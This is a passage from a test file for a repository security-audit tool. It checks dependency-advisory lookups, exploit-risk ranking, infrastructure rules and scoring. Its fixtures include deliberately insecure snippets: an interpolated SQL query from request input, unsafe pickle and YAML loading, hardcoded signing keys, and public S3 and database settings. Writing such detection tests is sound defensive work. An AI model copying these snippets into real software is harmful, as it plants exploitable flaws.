      { id: 'GHSA-p6mc-m468-83gw', cve: 'CVE-2020-8203', severity: 'serious', summary: 'Prototype pollution', fixed: '4.17.19', malicious: false }] }],
    ['npm:axios@1.7.4', { advisories: [] }],
    ['npm:minimist@1.2.5', { advisories: [{ id: 'GHSA-xvch-5gv4-984h', cve: 'CVE-2021-44906', severity: 'critical', summary: 'Prototype pollution', fixed: '1.2.6', malicious: false }] }],
    ['npm:follow-redirects@1.15.5', { advisories: [{ id: 'GHSA-cxjh-pqwp-8mfp', cve: null, severity: 'warning', summary: '', fixed: '1.15.6', malicious: false }] }],
    ['npm:event-stream@3.3.6', { advisories: [{ id: 'MAL-2018-1', cve: null, severity: 'critical', summary: 'Malicious code in event-stream', fixed: null, malicious: true }] }],
    ['npm:left-pad@1.3.0', 'unknown']
  ]);
  const result = run([...BASE.filter(file => file.path !== 'package-lock.json'), manifest, lock], { advisories });
  const deps = result.findings.filter(item => item.category === 'dependencies');
  const lodash = deps.find(item => item.detail && item.detail.package === 'lodash');
  assert.strictEqual(lodash.rule, 'DEP-003');
  assert.strictEqual(lodash.path, 'package.json', 'a declared package is reported where it is declared');
  assert.strictEqual(lodash.detail.fixed, '4.17.21', 'the version that clears every advisory');
  assert.match(lodash.prompt, /lodash 4\.17\.15 -- CVE-2021-23337, CVE-2020-8203; fixed in 4\.17\.21/);
  assert.strictEqual(deps.find(item => item.detail && item.detail.package === 'minimist').severity, 'serious', 'development tooling is one step less severe');
  const transitive = deps.find(item => item.detail && item.detail.package === 'follow-redirects');
  assert.strictEqual(transitive.path, 'package-lock.json');
  assert.strictEqual(transitive.line, lock.text.split('\n').findIndex(line => line.includes('"node_modules/follow-redirects"')) + 1);
  assert.strictEqual(deps.find(item => item.rule === 'DEP-006').severity, 'critical');
  assert.deepStrictEqual(deps.filter(item => item.rule === 'DEP-004').map(item => item.detail), [{ package: 'crossenv', resembles: 'cross-env' }]);
  assert.deepStrictEqual(result.advisoryStatus, { checked: 6, vulnerable: 3, malicious: 1, unknown: 1 }, 'a version with no answer is not counted as checked');
  assert.strictEqual(result.priorities.length, 3);
  assert.strictEqual(result.findings.find(item => item.id === result.priorities[0]).rule, 'DEP-006', 'a known-malicious package is the first job');

  /* A range whose floor is affected: a warning when the fix is inside the range, the advisory's own severity when it is not. */
  const ranged = { path: 'package.json', text: JSON.stringify({ dependencies: { lodash: '^4.17.0', 'old-lib': '~1.2.0' } }, null, 2) };
  const floors = new Map([
    ['npm:lodash@4.17.0', { advisories: [{ id: 'GHSA-a', cve: null, severity: 'critical', summary: '', fixed: '4.17.21', malicious: false }] }],
    ['npm:old-lib@1.2.0', { advisories: [{ id: 'GHSA-b', cve: null, severity: 'critical', summary: '', fixed: '2.0.0', malicious: false }] }]
  ]);
  const floorResult = run([{ path: 'README.md', text: '#' }, ranged], { advisories: floors });
  const byPackage = name => floorResult.findings.find(item => item.detail && item.detail.package === name);
  assert.strictEqual(byPackage('lodash').rule, 'DEP-005');
  assert.strictEqual(byPackage('lodash').severity, 'warning');
  assert.strictEqual(byPackage('old-lib').rule, 'DEP-003');
  assert.strictEqual(byPackage('old-lib').severity, 'critical', 'no version the range accepts is fixed');

  quiet('popular names', [...BASE, { path: 'package.json', text: JSON.stringify({ dependencies: { 'cross-env': '^7.0.3', react: '^18.0.0', preact: '^10.0.0', '@types/node': '^20.0.0' } }) }], ['DEP-004']);
  fires('python look-alike', [...BASE, { path: 'requirements.txt', text: 'python3-dateutil==2.8.2\n' }], ['DEP-004']);

  /* Other lockfile formats. */
  const yarn = audit.dependencyInventory([
    { path: 'package.json', text: JSON.stringify({ dependencies: { '@babel/core': '^7.0.0' } }) },
    { path: 'yarn.lock', text: '"@babel/core@^7.0.0", "@babel/core@^7.12.3":\n  version "7.24.0"\n\nms@2.1.2:\n  version "2.1.2"\n' }
  ]);
  assert.deepStrictEqual(yarn.map(entry => `${entry.name}@${entry.version}`), ['@babel/core@7.24.0', 'ms@2.1.2']);
  const pnpm = audit.dependencyInventory([{ path: 'pnpm-lock.yaml', text: "lockfileVersion: '9.0'\npackages:\n  lodash@4.17.21:\n    resolution: {}\n  '@scope/pkg@1.0.0(react@18.0.0)':\n    resolution: {}\n" }]);
  assert.deepStrictEqual(pnpm.map(entry => `${entry.name}@${entry.version}`), ['lodash@4.17.21', '@scope/pkg@1.0.0']);
  const poetry = audit.dependencyInventory([{ path: 'poetry.lock', text: '[[package]]\nname = "django"\nversion = "3.2.0"\n\n[[package]]\nname = "pytest"\nversion = "7.0.0"\ncategory = "dev"\n' }]);
  assert.deepStrictEqual(poetry.map(entry => `${entry.name}@${entry.version}${entry.dev ? ':dev' : ''}`), ['django@3.2.0', 'pytest@7.0.0:dev']);
}

/* ---- Exploit intelligence, reach and risk -------------------------------------------- */
{
  const lock = { lockfileVersion: 3, packages: {
    '': { dependencies: { express: '^4.17.0', jquery: '^3.4.0', lodash: '^4.17.0' }, devDependencies: { systeminformation: '^5.3.0' } },
    'node_modules/express': { version: '4.17.1', dependencies: { qs: '6.7.0' } },
    'node_modules/qs': { version: '6.7.0' },
    'node_modules/jquery': { version: '3.4.1' },
    'node_modules/lodash': { version: '4.17.15' },
    'node_modules/systeminformation': { version: '5.3.0', dev: true }
  } };
  const files = [
    { path: 'README.md', text: '#' },
    { path: 'package.json', text: JSON.stringify({ dependencies: lock.packages[''].dependencies, devDependencies: lock.packages[''].devDependencies }, null, 2) },
    { path: 'package-lock.json', text: JSON.stringify(lock, null, 2) },
    { path: 'server.js', text: "const express = require('express');\nexpress().listen(3000);\n" },
    { path: 'web/main.js', text: "import $ from 'jquery';\n" },
    { path: 'test/a.test.js', text: "require('lodash');\n" }
  ];
  const advisory = (id, cve, severity, cvss) => ({ id, cve, rated: true, severity, cvss, summary: '', fixed: '99.0.0', malicious: false });
  const advisories = new Map([
    ['npm:express@4.17.1', { advisories: [] }],
    ['npm:jquery@3.4.1', { advisories: [advisory('GHSA-jpcq-cgw6-v4j6', 'CVE-2020-11023', 'warning', 6.1)] }],
    ['npm:qs@6.7.0', { advisories: [advisory('GHSA-hrpp-h998-j3pp', 'CVE-2022-24999', 'serious', 7.5)] }],
    ['npm:lodash@4.17.15', { advisories: [advisory('GHSA-35jh-r3h4-6jhm', 'CVE-2021-23337', 'serious', 7.2)] }],
    ['npm:systeminformation@5.3.0', { advisories: [advisory('GHSA-2m8v-572m-ff2v', 'CVE-2021-21315', 'serious', 7.8)] }]
  ]);
  const listed = (added, due) => ({ added, due, ransomware: false });
  const intel = new Map([
    ['CVE-2020-11023', { epss: 0.84887, percentile: 0.99705, epssDate: '2026-09-28', kev: listed('2025-01-23', '2025-02-13') }],
    ['CVE-2022-24999', { epss: 0.15622, percentile: 0.96731, epssDate: '2026-09-28', kev: null }],
    ['CVE-2021-23337', { epss: 0.21333, percentile: 0.97527, epssDate: '2026-09-28', kev: null }],
    ['CVE-2021-21315', { epss: 0.90675, percentile: 0.99801, epssDate: '2026-09-28', kev: listed('2022-01-18', '2022-02-01') }]
  ]);
  const result = run(files, { advisories, intel });
  const of = name => result.findings.find(item => item.detail && item.detail.package === name);

  assert.deepStrictEqual(of('jquery').detail.usage, { tier: 'imported', files: ['web/main.js'], count: 1, through: [], throughCount: 0, chain: [], seen: null, loader: null, reason: null });
  assert.deepStrictEqual(of('jquery').detail.intel, { exploited: true, ransomware: false, kev: { cve: 'CVE-2020-11023', added: '2025-01-23', due: '2025-02-13', ransomware: false },
    epss: { cve: 'CVE-2020-11023', score: 0.84887, percentile: 0.99705, date: '2026-09-28' }, catalog: 'listed', cves: 1, scored: 1 });
  assert.strictEqual(of('jquery').detail.risk.band, 'urgent');
  assert.deepStrictEqual(of('jquery').detail.advisories[0], { id: 'GHSA-jpcq-cgw6-v4j6', cve: 'CVE-2020-11023', severity: 'warning', cvss: 6.1, summary: '', epss: 0.84887, kev: true });
  assert.match(of('jquery').prompt, /CISA lists CVE-2020-11023 as exploited in the wild/);
  assert.strictEqual(of('qs').detail.usage.tier, 'transitive');
  assert.deepStrictEqual(of('qs').detail.usage.chain, ['express', 'qs']);
  assert.match(of('qs').prompt, /it comes with express/);
  assert.strictEqual(of('qs').detail.intel.catalog, 'unlisted');
  assert.strictEqual(of('lodash').detail.usage.tier, 'installed', 'a production dependency only tests import is never "unused"');
  assert.strictEqual(of('lodash').detail.usage.seen, 'test');
  assert.strictEqual(of('systeminformation').detail.usage.tier, 'dev');
  assert.strictEqual(of('systeminformation').detail.intel.exploited, true);
  assert.notStrictEqual(of('systeminformation').detail.risk.band, 'urgent', 'exploited, but only a development tool');

  /* The grade is held by what is exploited and ships; Fix first leads with it though its advisory is only moderate. */
  assert.strictEqual(result.capReason, 'exploited');
  assert(result.score <= audit.CRITICAL_CAP);
  assert.strictEqual(result.findings.find(item => item.id === result.priorities[0]).detail.package, 'jquery');
  assert.deepStrictEqual(result.dependencyRisk, { exploited: 2, ransomware: 0, bands: { urgent: 1, high: 1, moderate: 2, low: 0 }, tiers: { imported: 1, transitive: 1, installed: 1, dev: 1 } });

  /* Without the catalog, nothing is exploited and nothing is clear; without any answer, there is no intel at all. */
  const unread = new Map([...intel].map(([cve, answer]) => [cve, { ...answer, kev: undefined }]));
  const blind = run(files, { advisories, intel: unread });
  assert.strictEqual(blind.findings.find(item => item.detail && item.detail.package === 'jquery').detail.intel.catalog, 'unknown');
  assert.notStrictEqual(blind.capReason, 'exploited', 'without the catalog nothing is held down as exploited');
  const none = run(files, { advisories });
  assert.strictEqual(none.findings.find(item => item.detail && item.detail.package === 'jquery').detail.intel, null);
  assert.strictEqual(none.findings.find(item => item.detail && item.detail.package === 'jquery').detail.usage.tier, 'imported', 'reach does not need the network');

  /* Source files that were not read make "no import found" unknown. */
  const partial = audit.analyse({ files, paths: [...files.map(file => file.path), 'src/unread.js'], advisories, intel });
  const partialLodash = partial.findings.find(item => item.detail && item.detail.package === 'lodash');
  assert.strictEqual(partialLodash.detail.usage.tier, 'unknown');
  assert.strictEqual(partialLodash.detail.usage.reason, 'unread');
}

/* ---- The advisory lookup ------------------------------------------------------------ */
(async () => {
  const calls = [];
  const transport = async input => {
    calls.push(input);
    if (input.url.endsWith('/querybatch')) {
      const queries = JSON.parse(input.body).queries;
      return { statusCode: 200, body: JSON.stringify({ results: queries.map(query => (query.package.name === 'lodash' ? { vulns: [{ id: 'PYSEC-ignored-alias' }, { id: 'GHSA-35jh-r3h4-6jhm' }] } : {})) }) };
    }
    if (input.url.endsWith('/GHSA-35jh-r3h4-6jhm')) {
      return { statusCode: 200, body: JSON.stringify({
        id: 'GHSA-35jh-r3h4-6jhm', aliases: ['CVE-2021-23337', 'PYSEC-ignored-alias'], summary: 'Command Injection in lodash\u0000',
        severity: [{ type: 'CVSS_V3', score: 'CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H' }],
        affected: [{ package: { ecosystem: 'npm', name: 'lodash' }, ranges: [{ type: 'SEMVER', events: [{ introduced: '0' }, { fixed: '4.17.21' }] }] }]
      }) };
    }
    return { statusCode: 404, body: '' };
  };
  const entries = [{ ecosystem: 'npm', name: 'lodash', version: '4.17.15' }, { ecosystem: 'npm', name: 'react', version: '18.2.0' }];
  const { answers, asked } = await audit.lookupAdvisories(entries, transport);
  assert.strictEqual(asked, 2);
  const lodash = answers.get('npm:lodash@4.17.15');
  assert.deepStrictEqual(lodash.advisories.map(advisory => [advisory.id, advisory.cve, advisory.severity, advisory.fixed]), [['GHSA-35jh-r3h4-6jhm', 'CVE-2021-23337', 'serious', '4.17.21']],
    'an alias of an advisory already listed is not listed twice; CVSS 7.2 is serious');
  assert.strictEqual(lodash.advisories[0].summary, 'Command Injection in lodash');
  assert.deepStrictEqual(answers.get('npm:react@18.2.0').advisories, []);
  assert(calls.every(input => input.profile === 'advisory-query' && !input.headers.authorization), 'anonymous, through the advisory profile');
  assert.strictEqual(calls.filter(input => input.method === 'POST').length, 1);

  const down = await audit.lookupAdvisories(entries, async () => { throw new Error('offline'); });
  assert.strictEqual(down.answers.get('npm:lodash@4.17.15'), 'unknown', 'an unreachable database leaves the version unknown');
})().catch(error => {
  console.error(error && error.stack || error);
  process.exitCode = 1;
});

/* ---- Infrastructure: containers, Terraform, Kubernetes, workflow tokens ---------- */
{
  const root = fires('root container, remote add, baked secret', [...BASE, { path: 'Dockerfile', text: 'FROM node:20.11.1\nADD https://example.test/tool.tgz /opt/\nENV API_TOKEN=abc123\nENV NODE_ENV=production\nCMD ["node", "app.js"]\n' }],
    ['IAC-001', 'IAC-002', 'IAC-003']);
  assert.deepStrictEqual(root.findings.filter(item => item.category === 'infrastructure').map(item => `${item.rule}:${item.line}`).sort(), ['IAC-001:1', 'IAC-002:2', 'IAC-003:3']);
  quiet('unprivileged image', [...BASE, { path: 'Dockerfile', text: 'FROM node:20.11.1 AS build\nRUN npm ci\nFROM node:20.11.1\nRUN useradd -r app\nUSER app\nENV API_TOKEN=${API_TOKEN}\nARG NPM_TOKEN\nADD --checksum=sha256:abc https://example.test/x /x\n' }], ['IAC-001', 'IAC-002', 'IAC-003']);
  quiet('distroless nonroot', [...BASE, { path: 'Dockerfile', text: 'FROM gcr.io/distroless/nodejs20-debian12:nonroot\nCOPY app /app\n' }], ['IAC-001']);
  fires('root after all', [...BASE, { path: 'Dockerfile', text: 'FROM node:20.11.1\nUSER app\nUSER root\n' }], ['IAC-001']);

  const tf = [
    'resource "aws_s3_bucket_acl" "logs" {',
    '  acl = "public-read-write"',
    '}',
    'resource "aws_security_group" "web" {',
    '  ingress {',
    '    from_port   = 5432',
    '    to_port     = 5432',
    '    protocol    = "tcp"',
    '    cidr_blocks = ["0.0.0.0/0"]',
    '  }',
    '  ingress {',
    '    from_port   = 443',
    '    to_port     = 443',
    '    protocol    = "tcp"',
    '    cidr_blocks = ["0.0.0.0/0"]',
    '  }',
    '}',
    'resource "aws_db_instance" "main" {',
    '  publicly_accessible = true',
    '  storage_encrypted   = false',
    '}'
  ].join('\n');
  const infra = fires('terraform', [...BASE, { path: 'infra/main.tf', text: tf }], ['IAC-005', 'IAC-006', 'IAC-007', 'IAC-008']);
  assert.strictEqual(infra.findings.find(item => item.rule === 'IAC-005').severity, 'critical', 'public-read-write lets anyone overwrite');
  assert.deepStrictEqual(infra.findings.filter(item => item.rule === 'IAC-006').map(item => item.line), [5], 'the database port, not the web port');
  quiet('private infrastructure', [...BASE, { path: 'infra/main.tf', text: 'resource "aws_s3_bucket_acl" "a" {\n  acl = "private"\n}\nresource "aws_security_group" "s" {\n  ingress {\n    from_port = 443\n    to_port = 443\n    protocol = "tcp"\n    cidr_blocks = ["0.0.0.0/0"]\n  }\n  ingress {\n    from_port = 22\n    to_port = 22\n    protocol = "tcp"\n    cidr_blocks = ["10.0.0.0/8"]\n  }\n}\nresource "aws_db_instance" "d" {\n  publicly_accessible = false\n  storage_encrypted = true\n}\n' }],
    ['IAC-005', 'IAC-006', 'IAC-007', 'IAC-008']);

  const k8s = 'apiVersion: apps/v1\nkind: Deployment\nspec:\n  template:\n    spec:\n      hostNetwork: true\n      containers:\n        - name: api\n          securityContext:\n            privileged: true\n            allowPrivilegeEscalation: true\n';
  fires('privileged workload', [...BASE, { path: 'deploy/api.yaml', text: k8s }], ['IAC-009', 'IAC-010']);
  quiet('restricted workload', [...BASE, { path: 'deploy/api.yaml', text: 'apiVersion: apps/v1\nkind: Deployment\nspec:\n  template:\n    spec:\n      containers:\n        - name: api\n          securityContext:\n            runAsNonRoot: true\n            runAsUser: 10001\n            allowPrivilegeEscalation: false\n' }], ['IAC-009', 'IAC-010']);
  quiet('an ordinary config file', [...BASE, { path: 'config/app.yml', text: 'privileged_users: 3\nhost: example.test\n' }], ['IAC-009']);

  fires('write-all token', [...BASE, { path: '.github/workflows/release.yml', text: 'on: push\npermissions: write-all\njobs:\n  r:\n    runs-on: ubuntu-latest\n' }], ['IAC-004']);
  quiet('least-privilege token', [...BASE, { path: '.github/workflows/release.yml', text: 'on: push\npermissions:\n  contents: read\njobs:\n  r:\n    runs-on: ubuntu-latest\n' }], ['IAC-004']);
}

/* ---- Password hashing, deserialization and signing keys -------------------------- */
{
  fires('fast password hash', [...BASE, { path: 'src/users.js', text: 'const digest = crypto.createHash("sha256").update(password).digest("hex");\n' }], ['SEC-023']);
  fires('python fast password hash', [...BASE, { path: 'users.py', text: 'hashed = hashlib.md5(password.encode()).hexdigest()\n' }], ['SEC-023']);
  quiet('a checksum', [...BASE, { path: 'src/files.js', text: 'const etag = crypto.createHash("sha256").update(body).digest("hex");\n' }], ['SEC-023']);

  fires('unpickling', [...BASE, { path: 'worker.py', text: 'job = pickle.loads(message.body)\nconf = yaml.load(stream)\n' }], ['SEC-024']);
  quiet('safe loading', [...BASE, { path: 'worker.py', text: 'conf = yaml.load(stream, Loader=yaml.SafeLoader)\nconf = yaml.safe_load(stream)\njob = json.loads(body)\n' }], ['SEC-024']);

  fires('signing key in code', [...BASE, { path: 'src/auth.js', text: 'const token = jwt.sign({ sub: user.id }, "change-me-please");\n' }], ['SEC-025']);
  fires('django key in settings', [...BASE, { path: 'app/settings.py', text: 'SECRET_KEY = "django-insecure-0123456789abcdef"\n' }], ['SEC-025']);
  quiet('key from the environment', [...BASE, { path: 'src/auth.js', text: 'const token = jwt.sign({ sub: user.id }, process.env.JWT_SECRET);\n' },
    { path: 'app/settings.py', text: 'SECRET_KEY = os.environ["SECRET_KEY"]\n' }], ['SEC-025']);
}

/* ---- Standards and waivers ---------------------------------------------------------- */
{
  const { MAPPED_RULES, standardsFor } = require('../src/security-standards');
  /* A licence is a term of use, not a weakness: those rules are the only ones no CWE describes, and are left unfiled on purpose. */
  const unmapped = Object.keys(audit.RULES).filter(rule => !MAPPED_RULES.includes(rule));
  assert.deepStrictEqual(unmapped, Object.keys(audit.RULES).filter(rule => audit.RULES[rule].category === 'licences'), 'every security rule sits under a CWE, so a team can file it');
  assert.strictEqual(standardsFor('LIC-001'), null, 'a licence finding claims no CWE');
  assert.deepStrictEqual(standardsFor('SEC-001'), { cwe: 'CWE-89', cweName: 'SQL Injection', owasp: 'A05:2025', owaspName: 'Injection', owaspBasis: 'cwe', top25: { rank: 2, year: 2025 } });
  const mapped = run([...BASE, { path: 'api/users.js', text: 'db.query(`SELECT * FROM users WHERE id = ${id}`);\n' }]);
  assert.strictEqual(mapped.findings[0].standards.cwe, 'CWE-89');

  /* A waiver names the rule, sits on the line or the one above, and keeps the finding visible. */
  const waived = run([...BASE, { path: 'src/nonce.js', text: [
    '// nv-audit-ignore SEC-005 -- a display nonce, not a secret',
    'const token = Math.random();',
    'const resetToken = Math.random(); // nv-audit-ignore SEC-001',
    '// nv-audit-ignore',
    'const sessionToken = Math.random();',
    'const otp = Math.random(); # nv-audit-ignore SEC-002, SEC-005: fixture for the demo'
  ].join('\n') }]);
  assert.deepStrictEqual(waived.findings.filter(item => item.rule === 'SEC-005').map(item => item.line), [3, 5], 'the wrong rule, or no rule, waives nothing');
  assert.deepStrictEqual(waived.suppressed.map(item => [item.line, item.suppression.reason]), [[2, 'a display nonce, not a secret'], [6, 'fixture for the demo']]);
  const onlyWaived = run([...BASE, { path: 'src/nonce.js', text: 'const token = Math.random(); // nv-audit-ignore SEC-005 -- display only\n' }]);
  const clean = run([...BASE, { path: 'src/nonce.js', text: 'const label = "nonce";\n' }]);
  assert.strictEqual(onlyWaived.score, clean.score, 'a waived finding is not scored');
  assert.strictEqual(onlyWaived.findings.filter(item => item.rule === 'SEC-005').length, 0);
}

/* ---- Hygiene ------------------------------------------------------------------ */
{
  const committed = fires('committed env', [{ path: 'README.md', text: '#' }, { path: '.env', text: 'X=1\n' }, { path: 'app.js', text: 'process.env.X\n' }], ['HYG-001', 'HYG-002']);
  assert.strictEqual(committed.findings.find(item => item.rule === 'HYG-001').severity, 'critical');
  quiet('env example only', [...BASE, { path: '.env.example', text: 'X=\n' }, { path: 'app.js', text: 'process.env.X\n' }], ['HYG-001', 'HYG-002']);

  const node = { path: 'package.json', text: JSON.stringify({ dependencies: { a: '*', b: 'latest', c: '^1.0.0' } }, null, 2) };
  fires('no lockfile and open versions', [{ path: 'README.md', text: '#' }, node], ['HYG-003', 'HYG-005']);
  fires('two lockfiles', [...BASE, node, { path: 'yarn.lock', text: '' }], ['HYG-004']);
  quiet('one lockfile', [...BASE, { path: 'package.json', text: JSON.stringify({ dependencies: { c: '^1.0.0' } }) }], ['HYG-003', 'HYG-004', 'HYG-005']);

  fires('unpinned images', [...BASE, { path: 'Dockerfile', text: 'FROM node\nFROM python:latest AS py\n' }], ['HYG-006']);
  quiet('pinned images and stages', [...BASE, { path: 'Dockerfile', text: 'FROM node:20.11.1 AS build\nFROM build\nFROM gcr.io/distroless/nodejs20-debian12@sha256:abc\nFROM scratch\n' }], ['HYG-006']);

  fires('strict off', [...BASE, { path: 'tsconfig.json', text: '{ "compilerOptions": { "strict": false } }' }], ['HYG-007']);
  quiet('strict on or inherited', [...BASE, { path: 'tsconfig.json', text: '{ "compilerOptions": { "strict": true } }' }, { path: 'web/tsconfig.json', text: '{ "extends": "../tsconfig.json" }' }], ['HYG-007']);

  const bare = run([{ path: 'a.js', text: '' }, { path: 'b.js', text: '' }, { path: 'c.js', text: '' }, { path: 'd.js', text: '' }, { path: 'e.js', text: '' }]);
  assert(bare.findings.some(item => item.rule === 'HYG-008') && bare.findings.some(item => item.rule === 'HYG-009'));
}

/* ---- Scoring, identity and what a finding carries ------------------------------ */
{
  const clean = run(BASE);
  assert.strictEqual(clean.score, 100);
  assert.strictEqual(clean.grade, 'A');
  assert.strictEqual(clean.capped, false);

  /* A statement built from a value nobody traced is a lead: it weighs half and caps nothing. */
  const pattern = run([...BASE, { path: 'api/users.js', text: 'db.query(`SELECT * FROM users WHERE id = ${id}`);\n' }]);
  const lead = pattern.findings.find(item => item.rule === 'SEC-001');
  assert.strictEqual(lead.verdict, 'needs-validation');
  assert.strictEqual(lead.evidence, 'pattern');
  assert(lead.blocker && lead.check, 'a finding to confirm says what is unknown and how to settle it');
  assert.strictEqual(pattern.capped, false, 'an untraced pattern does not cap the grade');

  /* The same statement with the value traced from the request is confirmed, and caps it. */
  const critical = run([...BASE, { path: 'api/users.js', text: "app.get('/users/:id', async (req, res) => {\n  const id = req.params.id;\n  await db.query(`SELECT * FROM users WHERE id = ${id}`);\n});\n" }]);
  const confirmed = critical.findings.find(item => item.rule === 'SEC-001');
  assert.strictEqual(confirmed.verdict, 'confirmed');
  assert.strictEqual(confirmed.evidence, 'traced');
  assert.deepStrictEqual(confirmed.trace.map(step => [step.role, step.line]), [['entrypoint', 2], ['sink', 3]]);
  assert.deepStrictEqual(confirmed.reach, { method: 'GET', route: '/users/:id', auth: 'open', framework: 'express' });
  assert(critical.score <= audit.CRITICAL_CAP, 'a confirmed critical finding holds the grade below the cap');
  assert.strictEqual(critical.grade, 'F');
  assert.strictEqual(critical.capped, true);

  /* One rule firing thirty times is one problem, not thirty. */
  const many = run([...BASE, { path: 'lib/t.js', text: 'const agent = new https.Agent({ rejectUnauthorized: false });\n'.repeat(30) }]);
  const code = many.categories.find(category => category.id === 'code');
  assert.strictEqual(code.counts.serious, 30);
  assert.strictEqual(code.score, 100 - audit.SEVERITY_PENALTY.serious * 2);

  /*
   * The letter never says less than the findings do. One rule firing nine
   * times scores as one problem in its category, and the weighted mean then
   * read 90 -- an A -- under a headline of nine serious issues to fix.
   * Confirmed serious findings now hold the grade: one or two to B at best,
   * three to five to C, six or more to D. Leads to confirm hold nothing.
   */
  const serious = (count, rules = count) => Array.from({ length: count }, (_, index) => ({
    rule: `T-${index % rules}`, category: 'code', severity: 'serious', verdict: 'confirmed'
  }));
  const nine = audit.score(serious(9, 1));
  assert.strictEqual(nine.grade, 'D', 'nine confirmed serious findings are not an A');
  assert(nine.score <= 69);
  assert.deepStrictEqual([nine.capped, nine.capReason], [true, 'serious']);
  const one = audit.score(serious(1));
  assert.deepStrictEqual([one.score, one.grade, one.capReason], [89, 'B', 'serious']);
  const three = audit.score(serious(3));
  assert.deepStrictEqual([three.score, three.grade, three.capReason], [79, 'C', 'serious']);
  const unconfirmed = audit.score([{ rule: 'T-0', category: 'code', severity: 'serious', verdict: 'needs-validation' }]);
  assert.strictEqual(unconfirmed.grade, 'A', 'a serious lead to confirm holds nothing');
  assert.strictEqual(unconfirmed.capped, false);
  /* Below the ceiling there is nothing to hold, and nothing is said to be held. */
  const low = audit.score(serious(9, 9));
  assert(low.score <= 69 && low.grade !== 'A');
  /* A critical still outranks it: held below 50, and named as the reason. */
  const both = audit.score([...serious(2), { rule: 'T-c', category: 'code', severity: 'critical', verdict: 'confirmed' }]);
  assert(both.score <= audit.CRITICAL_CAP);
  assert.strictEqual(both.grade, 'F');

  /* A finding names a place and never quotes it. */
  const secretLine = 'const resetToken = Math.random().toString(36).slice(2); // hunter2-canary';
  const quoted = run([...BASE, { path: 'lib/t.js', text: `${secretLine}\n` }]);
  const serialized = JSON.stringify(quoted);
  assert(!serialized.includes('hunter2-canary') && !serialized.includes('toString(36)'), 'no source text leaves the audit');
  const prompt = quoted.findings[0].prompt;
  assert.match(prompt, /^In lib\/t\.js \(line 1\): /);
  assert.match(prompt, /add or update a test that fails before the fix/);

  /* Identity is stable across runs and moves only with the rule, the file or the occurrence. */
  const again = run([...BASE, { path: 'lib/t.js', text: `\n\n${secretLine}\n` }]);
  assert.strictEqual(again.findings[0].id, quoted.findings[0].id, 'a finding keeps its identity when lines move');
}

/* ---- Selection -------------------------------------------------------------------- */
{
  const entries = [
    { path: 'node_modules/x/index.js', size: 10 }, { path: 'dist/app.js', size: 10 }, { path: 'public/app.min.js', size: 10 },
    { path: 'src/app.ts', size: 10 }, { path: 'package.json', size: 10 }, { path: 'big.js', size: audit.LIMITS.maxFileBytes + 1 },
    { path: 'logo.png', size: 10 }, { path: 'package-lock.json', size: 10 }
  ].map(entry => ({ ...entry, sha: 'a'.repeat(40) }));
  const selection = audit.selectFiles(entries);
  assert.deepStrictEqual(selection.selected.map(entry => entry.path), ['package.json', 'package-lock.json', 'src/app.ts'], 'manifests first, then the lockfile, then source; vendored, built and minified code is not the application');
  assert.deepStrictEqual(selection.skipped, { excluded: 3, oversize: 1, budget: 0 });
  /* Past the traced set, files go to the rules-only pass, up to its own ceiling; past that, they are counted as unread. */
  const tight = audit.selectFiles(entries, { ...audit.LIMITS, maxFiles: 1 });
  assert.deepStrictEqual(tight.overflow.map(entry => entry.path), ['package-lock.json', 'src/app.ts'], 'in the same order of priority');
  assert.strictEqual(tight.skipped.budget, 0);
  const tighter = audit.selectFiles(entries, { ...audit.LIMITS, maxFiles: 1, maxOverflowFiles: 1 });
  assert.deepStrictEqual(tighter.overflow.map(entry => entry.path), ['package-lock.json']);
  assert.strictEqual(tighter.skipped.budget, 1, 'what neither pass could take is counted, so coverage can say so');
}

/* ---- The whole audit against a reader and a registry ------------------------------ */
(async () => {
  const files = new Map([
    ['README.md', '# app\n'],
    ['package.json', JSON.stringify({ dependencies: { express: '^4.19.0', 'expresss-safe-router': '^1.0.0' } }, null, 2)],
    ['package-lock.json', '{}'],
    ['server.js', 'app.post("/api/login", handler);\n'],
    ['test/a.test.js', '']
  ]);
  const reader = {
    resolveCommit: async ({ ref }) => ({ ref, commitSha: 'c'.repeat(40) }),
    readTree: async () => ({
      truncated: false,
      skipped: [{ path: 'logo.png', reason: 'binary', sha: null }],
      entries: [...files.keys()].map(path => ({ path, sha: Buffer.from(path).toString('hex').padEnd(40, '0').slice(0, 40), size: files.get(path).length }))
    }),
    readBlob: async ({ sha }) => {
      const path = [...files.keys()].find(candidate => Buffer.from(candidate).toString('hex').padEnd(40, '0').slice(0, 40) === sha);
      return { text: files.get(path), skip: null };
    }
  };
  const asked = [];
  const registryTransport = async input => {
    asked.push(input);
    if (input.url.includes('expresss-safe-router')) return { statusCode: 404 };
    return { statusCode: 200 };
  };
  const result = await audit.auditRepository({ reader, scope: { provider: 'github', owner: 'a', repo: 'b' }, ref: 'main', token: 't', transport: null, registryTransport });
  assert.strictEqual(result.commitSha, 'c'.repeat(40));
  assert.deepStrictEqual(result.findings.map(item => item.rule).sort(), ['DEP-001', 'SEC-012']);
  assert.strictEqual(result.coverage.read, 4, 'the README is looked for, not read; the lockfile is read for versions');
  assert.strictEqual(result.coverage.complete, true);
  assert.deepStrictEqual(result.coverage.packages, { declared: 2, checked: 2, unknown: 0, notChecked: 0 });
  assert(asked.every(input => input.method === 'HEAD' && input.profile === 'provider-read'), 'registries are asked with HEAD through the guarded profile');

  /* A registry that cannot be reached leaves the package unknown, and says so. */
  const offline = await audit.auditRepository({ reader, scope: { provider: 'github', owner: 'a', repo: 'b' }, ref: 'main', token: 't', transport: null,
    registryTransport: async () => { throw new Error('down'); } });
  assert(!offline.findings.some(item => item.category === 'dependencies'));
  assert.strictEqual(offline.coverage.packages.unknown, 2);

  /* With the advisory database: the declared ranges are asked about, and the answer is reported against the manifest. */
  const advisoryTransport = async input => {
    if (input.url.endsWith('/querybatch')) {
      return { statusCode: 200, body: JSON.stringify({ results: JSON.parse(input.body).queries.map(query => (query.package.name === 'express' ? { vulns: [{ id: 'GHSA-qw6h-vgh9-j6wx' }] } : {})) }) };
    }
    return { statusCode: 200, body: JSON.stringify({ id: 'GHSA-qw6h-vgh9-j6wx', aliases: ['CVE-2024-43796'], summary: 'express vulnerable to XSS via response.redirect()', database_specific: { severity: 'LOW' },
      affected: [{ package: { ecosystem: 'npm', name: 'express' }, ranges: [{ type: 'ECOSYSTEM', events: [{ introduced: '0' }, { fixed: '4.20.0' }] }] }] }) };
  };
  const advised = await audit.auditRepository({ reader, scope: { provider: 'github', owner: 'a', repo: 'b' }, ref: 'main', token: 't', transport: null, registryTransport, advisoryTransport });
